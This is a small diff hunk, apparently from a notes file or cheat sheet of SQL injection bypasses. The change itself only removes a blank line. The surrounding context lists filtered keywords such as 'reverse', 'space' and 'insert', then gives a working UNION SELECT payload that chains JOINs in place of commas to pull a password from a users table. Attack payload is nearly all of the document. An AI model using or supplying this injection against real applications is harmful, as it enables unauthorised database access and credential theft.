@@ -40,7 +40,6 @@ reverse
 space (the word)
 insert
 
-
 Payload: 
 param=-1337 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT password FROM users Limit 1)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 
